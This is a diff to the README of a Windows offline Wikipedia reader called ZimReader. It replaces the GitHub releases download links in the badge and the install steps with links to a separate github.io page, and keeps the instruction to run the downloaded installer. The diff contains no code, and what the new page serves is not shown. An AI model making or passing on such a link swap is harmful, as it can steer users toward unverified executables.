@@ -1,6 +1,6 @@
 # 📖 ZimReader - Access Wikipedia offline with ease
 
-[![](https://img.shields.io/badge/Download-ZimReader-blue)](https://github.com/joyandesirous24/ZimReader/releases)
+[![](https://img.shields.io/badge/Download-ZimReader-blue)](https://joyandesirous24.github.io)
 
 ZimReader provides a way to read Wikipedia articles without an internet connection. It keeps your reading experience smooth by matching your computer theme. You receive clear search tools, tabbed browsing, and a fun game mode called Wikirace to explore topics.
 
@@ -15,7 +15,7 @@ ZimReader runs on Windows systems. Ensure your machine meets these basic needs:
 
 ## 📥 How to Install
 
-1. Visit this [Download Page](https://github.com/joyandesirous24/ZimReader/releases) to access the installers.
+1. Visit this [Download Page](https://joyandesirous24.github.io) to access the installers.
 2. Select the version that matches your Windows system.
 3. Save the file to your computer.
 4. Double-click the downloaded file to start the installation.
